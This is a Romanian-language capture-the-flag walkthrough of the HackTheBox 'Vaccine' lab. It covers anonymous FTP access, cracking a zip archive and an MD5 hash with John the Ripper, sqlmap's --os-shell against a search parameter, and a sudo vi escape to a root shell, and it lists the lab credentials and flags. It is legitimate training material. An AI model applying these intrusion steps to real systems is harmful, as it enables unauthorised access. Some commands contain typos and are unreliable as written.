1. Besides SSH and HTTP, what other service is hosted on this box?
Trebuie sa facem o scanare simpla cu [[Tools/nmap]]:
![[vaccine_nmap_sS]] Mai sus putem vedea fisierul  complect cu toata informatia care ne  fost returnata de [[Tools/nmap]] 
```bash 
sudo namp -sSCV -T4 <IP> -oN vaccine_nmap_sS
```
![[Pasted image 20230912112623.png]]
Raspunslul este `ftp`
2. This service can be configured to allow login with any password for specific username. What is that username?
Acum trebuei sa gasim care este utilizatorul care ne va permite sa ne logam anonim acesta este `anonymous` De unde stiu am mai facut unele boxuri unde am avut nevoie de utilizatorul dat.
Acum trebuie sa ne logam pe serviciul nostru putem face asta cu [[ftp]]:
```bash
ftp ftp://anonymous:@<IP>
```
Intre `:` si `@` trebuie sa fie password-ul dar `anonymous` nu are parola.
![[Pasted image 20230912113258.png]]
3. What is the name of the file downloaded over this service?
Cand suntem logati pe serviciul nostru trebui sa vedem ce se afla pe el. Putem face asta cu un singur [[ls]]:
![[Pasted image 20230912113409.png]]
Vedem ca este un fisier care este `backup.zip` care si pe urma a fost scos de pe masina noastra cu un `get <file>`
Raspunsul `backup.zip`
4. What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?
Deci aici avem nevoie de [[john]] dar nu stiu de care script merge vorba. 
Aici era nu eram departe dar scriptul este [[zip2john]] din care si putem scoate hasul pentru fisierele `zip` in felul urmator:
```bash
sudo zip2john <file.zip> > hash.<file.zip>.txt
```
![[hash.txt]]
Mai sus este fisierul in care este hash-ul:
Acum avem hash-ul pe care trebui sal spargem:
```bash 
sudo john -w /usr/share/wordlist/rockyou.txt --format=pkzip hash.txt
```
![[Pasted image 20230912114754.png]]
Avem si parola aici `741852963`
5. What is the password for the admin user on the website?
Din arhiva care am pututo so scot am 2 fisiere `index.php, style.css` nu cred ca o sa fie ceva interesant in `style.css` dar in `index.php` tot ce e posibil:
![[Pasted image 20230912114917.png]]
`2cb42f8734ea607eefed3b70af13bbd3`
Asa si este vedem o secventa de cod care are si parola dar care este reprezintata in `hash` de tip [[md5]] dar [[john]] se va descurca si cu asta:
```bash 
sudo john -w /ush/share/wordlists/rockyou.txt --format=raw-md5 admin_hash.txt
```

# Astep raspunsul de la masina:::::

Putem sa folosim si alta metoda care este mai simpla dar nu destul de ificienta:
![[Pasted image 20230912120500.png]]
Hostul: https://crackstation.net/  ne permite spargerea hasurilor slabe.
Raspunsul este `qwerty789`
6. What option can be passed to sqlmap to try to get command execution via the sql injection?
Avem nevoie sa facem doar un `--help` la [[sqlmap]] pentru avedea care este optiunea:
``` bash
sudo sqlmap -u http://10.129.79.165/dashboard.php?search= --cookie="PHPSESSID=epa06d0f28j4380mbghqveqglg" --os-shell
```
![[Pasted image 20230912130001.png]]
Raspunsul este `--os-shell`
7. What program can the postgres user run as root using sudo?
Pentru a rula comanda `sudo -l` avem nevoie de creditiale dar unde ele sunt acolo unde am fost de vreo 3 ori dar nu am vazut nimic. Cine e maladet eu.
![[Pasted image 20230912140611.png]]
Acum rulam comanda [[sudo]]
```bash 
echo "P@s5w0rd!" | sudo -S -U postgres -l 
```
![[Pasted image 20230912141022.png]]
Raspunsul este `vi`
8. Submit user flag
Nu stiu unde este flagul pentru user deci am decis sal caut:
```bash 
find / -type f -name "user.txt" 2>/dev/null
```
![[Pasted image 20230925112125.png]]
Flagul este `ec9b13ca4d6229cd5cc1e09980965bf7`
![[Pasted image 20230925112406.png]]
10. Submit root flag
Pentru a prim privile mai mare putem rula [[vi]] cu fisierul care putem sal modificam 
la departe 
`Esc`
`!/bin/bash`
Deci am primit acesul de root.
![[Pasted image 20230925111343.png]]
Flagul este `dd6e058e814260bc70e9bbdef2715849`
